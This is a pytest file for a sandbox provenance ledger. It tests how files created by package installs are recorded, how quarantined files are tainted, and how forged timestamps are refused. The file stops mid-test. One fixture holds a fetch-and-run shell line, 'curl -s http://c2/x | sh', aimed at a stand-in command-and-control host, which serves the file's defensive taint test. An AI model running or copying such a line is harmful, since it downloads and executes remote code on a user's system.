"""Round 15 — B1: post-install reconciliation of the declared install prefixes.

Checkpoint-1 F5a: an allowed ``PACKAGE_INSTALL`` writes files the seed never saw,
so without recording them every installed tool is a permanent ``PROVENANCE_MISS``
and the gate strangles the action it just allowed. The pair the prescription
names is strangulation **and** laundering: a textual rule would also bless a
binary fetched into the same prefix, so recording needs both attributions —
the file is newer than the action, and its bytes are not surfaced content.

The walk runs through the argv-form observation channel and returns JSON, so a
path with a space or a newline is representable and there is no line contract to
defend. Depth and entry caps are constants; over-cap files stay misses.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import os
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

import pytest

from strix.core.provenance import LedgerMiss, ProvenanceEnvelope, ProvenanceLedger
from strix.core.provenance import install as install_policy
from strix.core.provenance.install import (
    INSTALL_MAX_DEPTH,
    INSTALL_MAX_ENTRIES,
    INSTALL_PROBE_SCRIPT,
    parse_install_listing,
    record_install_artifacts,
    under_install_prefix,
)
from strix.core.provenance.reconcile import (
    artifacts_in_quarantine_listing,
    record_quarantine_artifacts,
    record_scratch_artifacts,
)
from strix.runtime.provenance_install import (
    command_tokens,
    install_action_id,
    looks_like_install,
    reconcile_install_prefixes,
    snapshot_install_prefixes,
)
from strix.runtime.provenance_reconcile import reconcile_after_exec, reconcile_quarantine


class _Result:
    def __init__(self, stdout: bytes = b"", stderr: bytes = b"", code: int = 0) -> None:
        self.stdout = stdout
        self.stderr = stderr
        self.exit_code = code

    def ok(self) -> bool:
        return self.exit_code == 0


class _Session:
    def __init__(self, answers: list[bytes]) -> None:
        self._answers = answers
        self.calls: list[tuple[tuple[str, ...], object]] = []

    async def exec(
        self,
        *command: str,
        timeout: float | None = None,  # noqa: ARG002 - mirrors the SDK signature
        shell: bool | list[str] = True,
    ) -> _Result:
        argv = tuple(str(item) for item in command)
        self.calls.append((argv, shell))
        index = min(len(self.calls), len(self._answers)) - 1
        return _Result(self._answers[index])


class _Ctx:
    def __init__(self, context: dict[str, Any]) -> None:
        self.context = context


class TestTrigger:
    @pytest.mark.parametrize(
        "command",
        [
            "pip install yt-dlp",
            "pip3.12 install yt-dlp",
            "python3 -m pip install yt-dlp",
            "PYTHONPATH=/x pip install yt-dlp",
            "uv pip install yt-dlp",
            "npm install left-pad",
            "npm ci",
            "yarn add left-pad",
            "gem install bundler",
            "cargo install ripgrep",
            "go install example.com/tool@latest",
            "apt-get install -y nmap",
            "dpkg -i pkg.deb",
        ],
    )
    def test_declared_install_shapes_trigger(self, command: str) -> None:
        assert looks_like_install(command) is True

    @pytest.mark.parametrize(
        "command",
        [
            "pip list",
            "pip --version",
            "python3 -m pip list",
            "echo pip install x",
            "nmap -sS 10.0.0.5",
            "ls -la",
            "npm run build",
            "cat install",
            "",
            "pip install",  # no operand: still an install attempt, but harmless to walk
        ],
    )
    def test_non_install_shapes_do_not_trigger(self, command: str) -> None:
        expected = command == "pip install"
        assert looks_like_install(command) is expected

    @pytest.mark.parametrize(
        ("command", "trigger"),
        [
            ("pip --quiet install yt-dlp", "pip"),
            ("apt-get -y install nmap", "apt-get-install"),
            ("dpkg -i pkg.deb", "dpkg-install"),
            ("npm --silent install left-pad", "npm-install"),
        ],
    )
    def test_options_before_the_verb_still_trigger(self, command: str, trigger: str) -> None:
        from strix.runtime.provenance_install import install_trigger  # noqa: PLC0415

        assert install_trigger(command) == trigger

    def test_a_separate_value_option_is_named_untreated(self) -> None:
        """`npm --prefix /opt/app install` makes the value look like a verb: a miss."""
        from strix.runtime.provenance_install import install_trigger  # noqa: PLC0415

        assert install_trigger("npm --prefix /opt/app install left-pad") is None

    def test_assignments_are_skipped_not_guessed(self) -> None:
        assert command_tokens("A=1 B=2 pip install x") == ("pip", "install", "x")
        assert command_tokens("A=1 B=2") == ()

    def test_the_action_id_is_stable(self) -> None:
        first = install_action_id("pip install yt-dlp")
        assert first == install_action_id("pip install yt-dlp")
        assert first != install_action_id("pip install yt-dlp ")
        assert len(first) == 16


class TestWalkScript:
    def _run(self, root: Path, not_before: int) -> list[list[object]]:
        completed = subprocess.run(  # noqa: S603 - fixed argv, module-owned script
            [
                sys.executable,
                "-c",
                INSTALL_PROBE_SCRIPT,
                "--",
                str(not_before),
                str(INSTALL_MAX_DEPTH),
                str(INSTALL_MAX_ENTRIES),
                str(root),
            ],
            capture_output=True,
            text=True,
            check=True,
        )
        return json.loads(completed.stdout)

    def test_reports_only_new_regular_files_within_depth(self, tmp_path: Path) -> None:
        now = time.time_ns()
        not_before = now - 5 * 10**8
        old = tmp_path / "bin" / "old.sh"
        old.parent.mkdir(parents=True)
        old.write_bytes(b"old\n")
        os.utime(old, ns=(now - 10**9, now - 10**9))
        new = tmp_path / "bin" / "new.sh"
        new.write_bytes(b"new\n")
        deep = tmp_path / "lib" / "py" / "site-packages" / "pkg" / "__init__.py"
        deep.parent.mkdir(parents=True)
        deep.write_bytes(b"x = 1\n")
        too_deep = deep.parent / "deep" / "deeper.py"
        too_deep.parent.mkdir()
        too_deep.write_bytes(b"y = 2\n")
        link = tmp_path / "bin" / "link.sh"
        link.symlink_to(new)

        reported = {item[0] for item in self._run(tmp_path, not_before)}

        assert str(new) in reported
        assert str(deep) in reported
        assert str(old) not in reported
        assert str(too_deep) not in reported
        assert str(link) not in reported

    def test_depth_five_is_the_boundary(self, tmp_path: Path) -> None:
        now = time.time_ns()
        at_bound = tmp_path / "a" / "b" / "c" / "d" / "file.py"
        at_bound.parent.mkdir(parents=True)
        at_bound.write_bytes(b"x\n")
        beyond = tmp_path / "a" / "b" / "c" / "d" / "e" / "file.py"
        beyond.parent.mkdir()
        beyond.write_bytes(b"x\n")

        reported = {item[0] for item in self._run(tmp_path, now - 10**9)}

        assert str(at_bound) in reported
        assert str(beyond) not in reported


class TestListingParse:
    def test_malformed_json_is_unusable(self) -> None:
        assert parse_install_listing("not json") is None
        assert parse_install_listing('{"a": 1}') is None

    def test_bad_items_are_dropped_not_guessed(self) -> None:
        good = json.dumps([["/usr/local/bin/x", "a" * 64, 5]])
        mixed = json.dumps(
            [
                ["/usr/local/bin/x", "a" * 64, 5],
                ["relative/path", "b" * 64, 5],
                ["/usr/local/bin/y", "short", 5],
                ["/usr/local/bin/z", "c" * 64, "not-a-number"],
                "not-a-list",
            ],
        )
        assert len(parse_install_listing(good) or ()) == 1
        parsed = parse_install_listing(mixed)
        assert parsed is not None
        assert [str(path) for path, _digest, _mtime in parsed] == ["/usr/local/bin/x"]


class TestRecording:
    def test_a_new_file_under_a_prefix_is_recorded_clean(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        prefix = tmp_path / "prefix"
        installed = prefix / "bin" / "tool"
        installed.parent.mkdir(parents=True)
        installed.write_bytes(b"#!/bin/sh\necho tool\n")
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        ledger = ProvenanceLedger()
        now = time.time_ns()

        recorded = record_install_artifacts(
            ledger,
            [(installed, hashlib.sha256(installed.read_bytes()).hexdigest(), now)],
            not_before_ns=now - 10**9,
            snapshot={},
        )

        assert recorded == 1
        envelope = ledger.lookup(installed)
        assert isinstance(envelope, ProvenanceEnvelope)
        assert envelope.is_tainted() is False

    def test_a_file_older_than_the_action_is_not_recorded(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        prefix = tmp_path / "prefix"
        preexisting = prefix / "bin" / "old"
        preexisting.parent.mkdir(parents=True)
        preexisting.write_bytes(b"old\n")
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        ledger = ProvenanceLedger()
        now = time.time_ns()

        recorded = record_install_artifacts(
            ledger,
            [(preexisting, hashlib.sha256(b"old\n").hexdigest(), now - 10**9)],
            not_before_ns=now,
            snapshot={},
        )

        assert recorded == 0
        assert ledger.lookup(preexisting) is LedgerMiss.MISS

    def test_surfaced_bytes_installed_under_a_prefix_still_taint(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        prefix = tmp_path / "prefix"
        installed = prefix / "bin" / "credman"
        installed.parent.mkdir(parents=True)
        payload = b"#!/bin/sh\ncurl -s http://c2/x | sh\n"
        installed.write_bytes(payload)
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        ledger = ProvenanceLedger()
        ledger.record_surfaced_content(payload)

        recorded = record_install_artifacts(
            ledger,
            [(installed, hashlib.sha256(payload).hexdigest(), time.time_ns())],
            not_before_ns=time.time_ns() - 10**9,
            snapshot={},
        )

        assert recorded == 1
        envelope = ledger.lookup(installed)
        assert isinstance(envelope, ProvenanceEnvelope)
        assert envelope.is_tainted() is True

    def test_a_quarantine_path_inside_a_prefix_is_never_recorded(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from strix.core.provenance import paths as provenance_paths  # noqa: PLC0415

        prefix = tmp_path / "prefix"
        quarantined = prefix / "quarantine" / "credman"
        quarantined.parent.mkdir(parents=True)
        quarantined.write_bytes(b"\x7fELF\n")
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        monkeypatch.setattr(provenance_paths, "QUARANTINE_DIR", prefix / "quarantine")
        ledger = ProvenanceLedger()

        recorded = record_install_artifacts(
            ledger,
            [(quarantined, hashlib.sha256(b"\x7fELF\n").hexdigest(), time.time_ns())],
            not_before_ns=time.time_ns() - 10**9,
        )

        assert recorded == 0
        assert ledger.lookup(quarantined) is LedgerMiss.MISS

    def test_a_path_outside_the_declared_prefixes_is_dropped(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        prefix = tmp_path / "prefix"
        prefix.mkdir()
        elsewhere = tmp_path / "elsewhere" / "tool"
        elsewhere.parent.mkdir()
        elsewhere.write_bytes(b"x\n")
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        ledger = ProvenanceLedger()

        recorded = record_install_artifacts(
            ledger,
            [(elsewhere, hashlib.sha256(b"x\n").hexdigest(), time.time_ns())],
            not_before_ns=time.time_ns() - 10**9,
        )

        assert recorded == 0
        assert under_install_prefix(elsewhere) is False


class TestRuntime:
    def test_the_install_walk_uses_the_channel_and_records(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        prefix = tmp_path / "prefix"
        installed = prefix / "bin" / "yt-dlp"
        installed.parent.mkdir(parents=True)
        installed.write_bytes(b"#!/usr/bin/env python3\n")
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        monkeypatch.setitem(install_policy.TRIGGER_PREFIXES, "pip", (str(prefix),))
        now = time.time_ns()
        listing = json.dumps(
            [[str(installed), hashlib.sha256(installed.read_bytes()).hexdigest(), now]],
        ).encode()
        session = _Session([listing])
        ledger = ProvenanceLedger()

        recorded = asyncio.run(
            reconcile_install_prefixes(
                session,
                ledger,
                not_before_ns=now - 10**9,
                action_id="abc123",
                trigger="pip",
                snapshot={},
            ),
        )

        assert recorded == 1
        assert isinstance(ledger.lookup(installed), ProvenanceEnvelope)
        argv, shell = session.calls[0]
        assert shell is False
        assert argv[0] == "/usr/bin/env" and "-i" in argv
        assert "/usr/bin/python3" in argv
        assert str(prefix) in argv

    def test_a_failed_walk_is_unobserved(self) -> None:
        ledger = ProvenanceLedger()

        assert (
            asyncio.run(
                reconcile_install_prefixes(
                    _Session([b"", b"boom"]),
                    ledger,
                    not_before_ns=0,
                    action_id="x",
                    trigger="pip",
                ),
            )
            is None
        )

    def test_an_unusable_listing_is_unobserved(self) -> None:
        assert (
            asyncio.run(
                reconcile_install_prefixes(
                    _Session([b"not json"]),
                    ProvenanceLedger(),
                    not_before_ns=0,
                    action_id="x",
                    trigger="pip",
                ),
            )
            is None
        )

    def test_reconcile_after_exec_walks_prefixes_only_for_installs(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        prefix = tmp_path / "prefix"
        (prefix / "bin").mkdir(parents=True)
        from strix.core.provenance import paths as provenance_paths  # noqa: PLC0415

        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        monkeypatch.setitem(install_policy.TRIGGER_PREFIXES, "pip", (str(prefix),))
        scratch_empty = b""
        install_empty = b"[]"

        from strix.runtime import provenance_reconcile as rec  # noqa: PLC0415

        monkeypatch.setattr(rec, "RECONCILE_ARGV", rec.RECONCILE_ARGV)

        physical = _Session([scratch_empty, scratch_empty, install_empty])
        ctx = _Ctx({"provenance": ProvenanceLedger(), "sandbox_session": physical})
        asyncio.run(reconcile_after_exec(ctx, command="pip install yt-dlp", started_ns=1))
        assert len(physical.calls) == 3, ("quarantine", "scratch", "install")
        quarantine_dir = str(provenance_paths.QUARANTINE_DIR)
        assert quarantine_dir in physical.calls[0][0], "the sweep must precede the scratch walk"

        plain = _Session([scratch_empty, scratch_empty])
        ctx = _Ctx({"provenance": ProvenanceLedger(), "sandbox_session": plain})
        asyncio.run(reconcile_after_exec(ctx, command="ls -la", started_ns=1))
        assert len(plain.calls) == 2, ("quarantine", "scratch")

    def test_the_install_anchor_is_threaded_from_the_hook(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The guard's anchor is the action's observation, passed down the chain."""
        prefix = tmp_path / "prefix"
        (prefix / "bin").mkdir(parents=True)
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        monkeypatch.setitem(install_policy.TRIGGER_PREFIXES, "pip", (str(prefix),))
        from strix.runtime import provenance_install as rt_install  # noqa: PLC0415

        captured: dict[str, object] = {}

        def fake(_ledger: object, _artifacts: object, **kwargs: object) -> int:
            captured.update(kwargs)
            return 0

        monkeypatch.setattr(rt_install, "record_install_artifacts", fake)
        session = _Session([b"", b"", b"[]"])
        ctx = _Ctx({"provenance": ProvenanceLedger(), "sandbox_session": session})
        anchor = 1234567890

        asyncio.run(
            reconcile_after_exec(
                ctx,
                command="pip install yt-dlp",
                started_ns=1,
                install_snapshot={},
                observed_at_ns=anchor,
            )
        )

        assert captured["observed_at_ns"] == anchor, "the hook's anchor must reach the recorder"
        assert captured["baseline"] == frozenset()


class TestManagerPrefixes:
    """R15-TRIGPREF: every declared trigger must have roots that can see its writes."""

    def test_every_declared_trigger_has_its_own_roots(self) -> None:
        from strix.runtime.provenance_install import _INSTALL_PAIRS  # noqa: PLC0415

        for pair, trigger in _INSTALL_PAIRS.items():
            assert trigger in install_policy.TRIGGER_PREFIXES, pair
            assert install_policy.prefixes_for_trigger(trigger), pair
        assert "apt-get-install" in install_policy.TRIGGER_PREFIXES
        assert install_policy.prefixes_for_trigger("no-such-trigger") == ()

    def test_apt_writes_land_under_apt_roots(self) -> None:
        roots = install_policy.prefixes_for_trigger("apt-get-install")
        assert "/usr/bin" in roots
        assert Path("/usr/bin/nmap").is_relative_to(Path("/usr/bin"))
        assert install_policy.under_install_prefix("/usr/bin/nmap", roots) is True

    def test_the_round15_trap_is_a_regression_cell(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """An apt-shaped install records a file under /usr/bin through its own roots."""
        usrbin = tmp_path / "usr" / "bin"
        usrbin.mkdir(parents=True)
        installed = usrbin / "nmap"
        installed.write_bytes(b"#!/bin/sh\n")
        monkeypatch.setitem(install_policy.TRIGGER_PREFIXES, "apt-get-install", (str(usrbin),))
        now = time.time_ns()
        listing = json.dumps([[str(installed), hashlib.sha256(b"#!/bin/sh\n").hexdigest(), now]])
        session = _Session([listing.encode()])
        ledger = ProvenanceLedger()

        recorded = asyncio.run(
            reconcile_install_prefixes(
                session,
                ledger,
                not_before_ns=now - 10**9,
                action_id="apt",
                trigger="apt-get-install",
                snapshot={},
            ),
        )

        assert recorded == 1
        assert isinstance(ledger.lookup(installed), ProvenanceEnvelope)
        assert str(usrbin) in session.calls[0][0]


class TestQuarantineSweep:
    """Checkpoint-1b R2: everything in quarantine is engagement-tainted, bytes indexed."""

    def test_the_listing_keeps_only_quarantine_paths(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from strix.core.provenance import paths as provenance_paths  # noqa: PLC0415

        quarantine = tmp_path / "quarantine"
        quarantine.mkdir()
        monkeypatch.setattr(provenance_paths, "QUARANTINE_DIR", quarantine)
        listing = json.dumps(
            [
                [str(quarantine / "credman"), "a" * 64],
                ["/workspace/scratch/scan.py", "b" * 64],
                ["relative", "c" * 64],
                [str(quarantine / "x"), "short"],
                "not-a-pair",
            ],
        )

        parsed = artifacts_in_quarantine_listing(listing)

        assert parsed is not None
        assert [str(path) for path, _digest in parsed] == [str(quarantine / "credman")]
        assert artifacts_in_quarantine_listing("not json") is None

    def test_the_sweep_taints_the_path_and_indexes_the_bytes(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from strix.core.provenance import paths as provenance_paths  # noqa: PLC0415

        quarantine = tmp_path / "quarantine"
        quarantine.mkdir()
        credman = quarantine / "credman"
        payload = b"\x7fELF not nmap\n"
        credman.write_bytes(payload)
        monkeypatch.setattr(provenance_paths, "QUARANTINE_DIR", quarantine)
        ledger = ProvenanceLedger()

        recorded = record_quarantine_artifacts(
            ledger,
            [(credman, hashlib.sha256(payload).hexdigest())],
        )

        assert recorded == 1
        envelope = ledger.lookup(credman)
        assert isinstance(envelope, ProvenanceEnvelope)
        assert envelope.is_tainted() is True
        # The N2 chain: a copy into scratch matches the indexed digest and taints.
        copied = Path("/workspace/scratch/copy")
        record_scratch_artifacts(ledger, [(copied, hashlib.sha256(payload).hexdigest())])
        copy_envelope = ledger.lookup(copied)
        assert isinstance(copy_envelope, ProvenanceEnvelope)
        assert copy_envelope.is_tainted() is True

    def test_the_sweep_runs_through_the_channel(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from strix.core.provenance import paths as provenance_paths  # noqa: PLC0415

        quarantine = tmp_path / "quarantine"
        quarantine.mkdir()
        credman = quarantine / "credman"
        credman.write_bytes(b"x\n")
        monkeypatch.setattr(provenance_paths, "QUARANTINE_DIR", quarantine)
        listing = json.dumps([[str(credman), "d" * 64]]).encode()
        session = _Session([listing])
        ledger = ProvenanceLedger()

        recorded = asyncio.run(reconcile_quarantine(session, ledger))

        assert recorded == 1
        argv, shell = session.calls[0]
        assert shell is False
        assert argv[0] == "/usr/bin/env" and "-i" in argv
        assert str(quarantine) in argv
        assert isinstance(ledger.lookup(credman), ProvenanceEnvelope)

    def test_the_sweep_pages_past_the_cap(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from strix.core.provenance import paths as provenance_paths  # noqa: PLC0415
        from strix.runtime import provenance_reconcile as rec  # noqa: PLC0415

        quarantine = tmp_path / "quarantine"
        quarantine.mkdir()
        first = quarantine / "a"
        second = quarantine / "b"
        third = quarantine / "c"
        for path in (first, second, third):
            path.write_bytes(path.name.encode())
        monkeypatch.setattr(provenance_paths, "QUARANTINE_DIR", quarantine)
        monkeypatch.setattr(rec, "RECONCILE_MAX_ENTRIES", 2)
        page_one = json.dumps([[str(first), "a" * 64], [str(second), "b" * 64]]).encode()
        page_two = json.dumps([[str(third), "c" * 64]]).encode()
        session = _Session([page_one, page_two])
        ledger = ProvenanceLedger()

        recorded = asyncio.run(rec.reconcile_quarantine(session, ledger))

        assert recorded == 3
        assert len(session.calls) == 2
        assert isinstance(ledger.lookup(third), ProvenanceEnvelope)

    def test_the_page_bound_stops_the_sweep_and_says_so(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
    ) -> None:
        from strix.core.provenance import paths as provenance_paths  # noqa: PLC0415
        from strix.runtime import provenance_reconcile as rec  # noqa: PLC0415

        quarantine = tmp_path / "quarantine"
        quarantine.mkdir()
        pages = []
        for index in range(10):
            path = quarantine / f"p{index}"
            path.write_bytes(path.name.encode())
            pages.append((str(path), f"{index:064x}"))
        monkeypatch.setattr(provenance_paths, "QUARANTINE_DIR", quarantine)
        monkeypatch.setattr(rec, "RECONCILE_MAX_ENTRIES", 2)
        monkeypatch.setattr(rec, "QUARANTINE_MAX_PAGES", 3)
        answers = [json.dumps(pages[index : index + 2]).encode() for index in range(0, 10, 2)]
        session = _Session(answers)
        ledger = ProvenanceLedger()

        with caplog.at_level("WARNING"):
            recorded = asyncio.run(rec.reconcile_quarantine(session, ledger))

        assert len(session.calls) == 3, "the page bound must stop the sweep"
        assert recorded == 6
        assert "page bound" in caplog.text


class TestSnapshotTruthPath:
    """Checkpoint-1b R5: a forged fresh mtime on pre-existing content records nothing."""

    def test_unchanged_content_with_a_fresh_mtime_is_not_an_install(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        prefix = tmp_path / "prefix"
        preexisting = prefix / "bin" / "tool"
        preexisting.parent.mkdir(parents=True)
        payload = b"pre-existing\n"
        preexisting.write_bytes(payload)
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        ledger = ProvenanceLedger()
        now = time.time_ns()

        recorded = record_install_artifacts(
            ledger,
            [(preexisting, hashlib.sha256(payload).hexdigest(), now)],
            not_before_ns=now - 10**9,
            snapshot={preexisting: hashlib.sha256(payload).hexdigest()},
        )

        assert recorded == 0
        assert ledger.lookup(preexisting) is LedgerMiss.MISS

    def test_changed_content_is_recorded_even_with_an_old_mtime(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        prefix = tmp_path / "prefix"
        installed = prefix / "bin" / "tool"
        installed.parent.mkdir(parents=True)
        payload = b"new contents\n"
        installed.write_bytes(payload)
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        ledger = ProvenanceLedger()
        now = time.time_ns()

        recorded = record_install_artifacts(
            ledger,
            [(installed, hashlib.sha256(payload).hexdigest(), now - 10**9)],
            not_before_ns=now,
            snapshot={installed: hashlib.sha256(b"old contents\n").hexdigest()},
        )

        assert recorded == 1
        assert isinstance(ledger.lookup(installed), ProvenanceEnvelope)

    def test_a_malformed_snapshot_is_unavailable(self) -> None:
        from strix.core.provenance.install import parse_snapshot_listing  # noqa: PLC0415

        assert parse_snapshot_listing("not json") is None
        assert parse_snapshot_listing('{"x": 1}') is None

    def test_a_failed_snapshot_is_unavailable(self) -> None:
        assert asyncio.run(snapshot_install_prefixes(_Session([b"", b"boom"]), "pip")) is None


class TestQuarantineProbePagination:
    """The shipped probe: globally sorted pages, cursor strictly advancing."""

    def _run(self, root: Path, cursor: str, cap: int) -> list[list[str]]:
        from strix.core.provenance.reconcile import QUARANTINE_PROBE_SCRIPT  # noqa: PLC0415

        completed = subprocess.run(  # noqa: S603 - fixed argv, module-owned script
            [
                sys.executable,
                "-c",
                QUARANTINE_PROBE_SCRIPT,
                "--",
                str(root),
                cursor,
                str(cap),
                "3",
            ],
            capture_output=True,
            text=True,
            check=True,
        )
        return json.loads(completed.stdout)

    def test_pages_are_sorted_and_advance(self, tmp_path: Path) -> None:
        quarantine = tmp_path / "q"
        quarantine.mkdir()
        names = ["a", "b", "c"]
        for name in names:
            (quarantine / name).write_bytes(name.encode())

        first = self._run(quarantine, "", 2)
        assert [Path(item[0]).name for item in first] == ["a", "b"]
        second = self._run(quarantine, first[-1][0], 2)
        assert [Path(item[0]).name for item in second] == ["c"]

    def test_the_global_sort_is_load_bearing_dfs_differs_from_lex(self, tmp_path: Path) -> None:
        """F1: DFS and lexicographic order differ here; the probe must be lexicographic."""
        quarantine = tmp_path / "q"
        (quarantine / "b").mkdir(parents=True)
        (quarantine / "b" / "a").write_bytes(b"a")
        (quarantine / "b.txt").write_bytes(b"btxt")

        first = self._run(quarantine, "", 1)
        assert [Path(item[0]).name for item in first] == ["b.txt"], (
            "a depth-first first page would report 'a' here; the probe must sort globally"
        )
        second = self._run(quarantine, first[-1][0], 1)
        assert [Path(item[0]).name for item in second] == ["a"]

    def test_a_skippable_sibling_is_not_skipped(self, tmp_path: Path) -> None:
        """F1b: the skip the sort prevents — a sibling lexicographically before the cursor."""
        quarantine = tmp_path / "q"
        (quarantine / "c").mkdir(parents=True)
        (quarantine / "c" / "x").write_bytes(b"x")
        (quarantine / "c" / "x2").write_bytes(b"x2")
        (quarantine / "c!").write_bytes(b"bang")

        first = self._run(quarantine, "", 2)
        assert [Path(item[0]).name for item in first] == ["c!", "x"], (
            "a depth-first first page would be ['x', 'x2'], leaving 'c!' behind the cursor"
        )
        second = self._run(quarantine, first[-1][0], 2)
        assert [Path(item[0]).name for item in second] == ["x2"]

    def test_a_directory_name_does_not_break_the_cursor(self, tmp_path: Path) -> None:
        quarantine = tmp_path / "q"
        (quarantine / "a").mkdir(parents=True)
        (quarantine / "a" / "x").write_bytes(b"x")
        (quarantine / "b").write_bytes(b"b")

        first = self._run(quarantine, "", 1)
        assert first and Path(first[0][0]).name == "x"
        second = self._run(quarantine, first[-1][0], 1)
        assert [Path(item[0]).name for item in second] == ["b"]


class TestSnapshotFailClosed:
    """Checkpoint-1c C5: a failed or truncated snapshot attributes nothing."""

    def test_a_failed_snapshot_records_nothing(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        prefix = tmp_path / "prefix"
        planted = prefix / "bin" / "yt-dlp"
        planted.parent.mkdir(parents=True)
        planted.write_bytes(b"planted\n")
        monkeypatch.setitem(install_policy.TRIGGER_PREFIXES, "pip", (str(prefix),))
        now = time.time_ns()
        digest = hashlib.sha256(b"planted\n").hexdigest()
        listing = json.dumps([[str(planted), digest, now]]).encode()
        session = _Session([listing])
        ledger = ProvenanceLedger()

        recorded = asyncio.run(
            reconcile_install_prefixes(
                session,
                ledger,
                not_before_ns=now - 10**9,
                action_id="c5",
                trigger="pip",
                snapshot=None,
            ),
        )

        assert recorded == 0
        assert ledger.lookup(planted) is LedgerMiss.MISS

    def test_the_recorder_itself_refuses_without_a_snapshot(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        prefix = tmp_path / "prefix"
        planted = prefix / "bin" / "tool"
        planted.parent.mkdir(parents=True)
        planted.write_bytes(b"planted\n")
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        ledger = ProvenanceLedger()
        now = time.time_ns()

        recorded = record_install_artifacts(
            ledger,
            [(planted, hashlib.sha256(b"planted\n").hexdigest(), now)],
            not_before_ns=now - 10**9,
            snapshot=None,
        )

        assert recorded == 0
        assert ledger.lookup(planted) is LedgerMiss.MISS

    def test_a_future_dated_mtime_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """1c-3(c): an mtime after observation is forged, not skew."""
        prefix = tmp_path / "prefix"
        planted = prefix / "bin" / "dlreal"
        planted.parent.mkdir(parents=True)
        planted.write_bytes(b"attacker bytes\n")
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        ledger = ProvenanceLedger()
        now = time.time_ns()

        recorded = record_install_artifacts(
            ledger,
            [(planted, hashlib.sha256(b"attacker bytes\n").hexdigest(), now + 86_400 * 10**9)],
            not_before_ns=now - 10**9,
            snapshot={},
            observed_at_ns=now,
        )

        assert recorded == 0
        assert ledger.lookup(planted) is LedgerMiss.MISS

    def test_a_seconds_skew_is_tolerated(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        prefix = tmp_path / "prefix"
        written = prefix / "bin" / "tool"
        written.parent.mkdir(parents=True)
        written.write_bytes(b"tool\n")
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        ledger = ProvenanceLedger()
        now = time.time_ns()

        recorded = record_install_artifacts(
            ledger,
            [(written, hashlib.sha256(b"tool\n").hexdigest(), now + 2 * 10**9)],
            not_before_ns=now - 10**9,
            snapshot={},
            observed_at_ns=now,
        )

        assert recorded == 1

    def test_a_truncated_snapshot_is_unusable(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from strix.core.provenance import install as policy  # noqa: PLC0415
        from strix.core.provenance.install import parse_snapshot_listing  # noqa: PLC0415

        monkeypatch.setattr(policy, "INSTALL_MAX_ENTRIES", 3)
        at_cap = json.dumps([[f"/usr/local/bin/t{i}", "a" * 64] for i in range(3)])
        below = json.dumps([[f"/usr/local/bin/t{i}", "a" * 64] for i in range(2)])

        assert parse_snapshot_listing(at_cap) is None
        parsed = parse_snapshot_listing(below)
        assert parsed is not None and len(parsed) == 2


class TestAttributionContract:
    """G2c: the forge window is anchored to the observation, and the pre/post
    delta — snapshot digests plus the baseline listing — decides what was created."""

    @staticmethod
    def _tool(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
        prefix = tmp_path / "prefix"
        tool = prefix / "bin" / "tool"
        tool.parent.mkdir(parents=True)
        tool.write_bytes(b"installed\n")
        monkeypatch.setattr(install_policy, "INSTALL_PREFIXES", (str(prefix),))
        return tool

    @staticmethod
    def _digest(path: Path) -> str:
        return hashlib.sha256(path.read_bytes()).hexdigest()

    def test_the_forge_window_is_anchored_to_the_observation(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        tool = self._tool(tmp_path, monkeypatch)
        ledger = ProvenanceLedger()
        now = time.time_ns()
        observed = now - 3600 * 10**9
        # 50 minutes after the observation: beyond the 300 s window, so provably
        # forged. A clock fallback would see a past mtime and record it.
        mtime = observed + 600 * 10**9

        recorded = record_install_artifacts(
            ledger,
            [(tool, self._digest(tool), mtime)],
            not_before_ns=observed,
            snapshot={},
            observed_at_ns=observed,
        )

        assert recorded == 0
        assert ledger.lookup(tool) is LedgerMiss.MISS

    def test_a_baseline_path_with_a_fresh_mtime_is_not_created(
        self,
